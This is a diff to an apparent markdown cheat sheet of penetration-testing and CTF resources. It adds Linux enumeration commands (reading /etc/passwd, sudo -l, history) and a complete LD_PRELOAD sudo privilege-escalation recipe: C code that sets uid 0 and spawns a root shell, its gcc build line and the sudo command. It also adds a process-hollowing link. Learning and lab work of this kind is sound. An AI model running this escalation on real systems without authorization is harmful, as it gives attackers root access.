@@ -279,6 +279,48 @@
 
 * [PEASS-ng](https://github.com/carlospolop/PEASS-ng)
 * [GTFOBins](https://gtfobins.github.io/)
+* Linux
+  * Commands
+    * ``hostname``
+    * ``uname -a``
+    * ``/proc/version``
+    * ``/etc/issue``
+    * ps
+      * ``ps``
+      * ``ps -A``
+      * ``ps axjf``
+      * ``ps aux``
+    * ``env``
+    * ``sudo -l``
+    * ``id``
+    * ``/etc/passwd``
+      * ``cat /etc/passwd | cut -d ":" -f 1``
+      * ``cat /etc/passwd | grep home``
+    * ``history``
+    * ``ifconfig``
+    * ``ip route``
+    * ``netstat``
+      * ``netstat -a``
+    * ``find``
+      * ``find /home -name flag1.txt``
+  * [LinPeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
+  * [LinEnum](https://github.com/rebootuser/LinEnum)
+  * Kernel Exploit
+    * [https://www.linuxkernelcves.com/cves](https://www.linuxkernelcves.com/cves)
+  * Sudo
+    * ``sudo -l``
+    * [https://gtfobins.github.io/](https://gtfobins.github.io/)
+    * [LD_PRELOAD](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/)
+      Generate a shared library which will be loaded and executed before the program is run.
+      1. Check for LD_PRELOAD (with the env_keep option)
+      2. Write a simple C code compiled as a share object (.so extension) file
+         * ``#include <stdio.h> #include <sys/types.h> #include <stdlib.h> void _init() { unsetenv("LD_PRELOAD"); setgid(0); setuid(0); system("/bin/bash"); }``
+         * ``gcc -fPIC -shared -o shell.so shell.c -nostartfiles``
+      3. Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file
+         * ``sudo LD_PRELOAD=/home/user/ldpreload/shell.so find``
+  * SUID
+  * 
+* Windows
 
 #### OSINT
 
@@ -323,6 +365,7 @@
 
 - [malapi.io](https://malapi.io/)
 - [Windows API](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa)
+- [Process Hollowing](https://attack.mitre.org/techniques/T1055/012/)
 - [https://github.com/PatrikH0lop/malware_showcase](https://github.com/PatrikH0lop/malware_showcase)
 - [Yara Rules](https://yara.readthedocs.io/en/stable/writingrules.html)
 - Static Malware Analysis
